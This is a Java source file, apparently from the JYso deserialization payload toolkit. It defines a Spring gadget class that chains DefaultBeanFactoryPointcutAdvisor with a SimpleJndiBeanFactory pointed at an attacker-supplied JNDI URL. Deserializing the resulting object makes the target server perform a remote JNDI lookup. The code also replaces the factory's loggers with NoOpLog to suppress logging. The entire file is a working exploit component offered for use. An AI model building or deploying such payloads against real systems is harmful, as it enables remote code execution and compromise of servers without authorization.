package com.qi4l.JYso.gadgets;

import com.qi4l.JYso.gadgets.utils.Reflections;
import org.apache.commons.logging.impl.NoOpLog;
import org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor;
import org.springframework.beans.factory.BeanFactory;
import org.springframework.jndi.support.SimpleJndiBeanFactory;

public class SpringAbstractBeanFactoryPointcutAdvisor implements ObjectPayload<Object>{
    @Override
    public Object getObject(String command) throws Exception {
        return makeBeanFactoryPointcutAdvisor(command);
    }
    public Object makeBeanFactoryPointcutAdvisor (String args ) throws Exception {
        String jndiUrl = args;
        UtilFactory uf = new UtilFactory();
        BeanFactory bf = makeJNDITrigger(jndiUrl);
        return makeBeanFactoryTriggerBFPA(uf,jndiUrl, bf);
    }

    public static Object makeBeanFactoryTriggerBFPA (UtilFactory uf,String name, BeanFactory bf ) throws Exception {
        DefaultBeanFactoryPointcutAdvisor pcadv = new DefaultBeanFactoryPointcutAdvisor();
        pcadv.setBeanFactory(bf);
        pcadv.setAdviceBeanName(name);
        return uf.makeEqualsTrigger(pcadv, new DefaultBeanFactoryPointcutAdvisor());
    }
    public static BeanFactory makeJNDITrigger ( String jndiUrl ) throws Exception {
        SimpleJndiBeanFactory bf = new SimpleJndiBeanFactory();
        bf.setShareableResources(jndiUrl);
        Reflections.setFieldValue(bf, "logger", new NoOpLog());
        Reflections.setFieldValue(bf.getJndiTemplate(), "logger", new NoOpLog());
        return bf;
    }
}
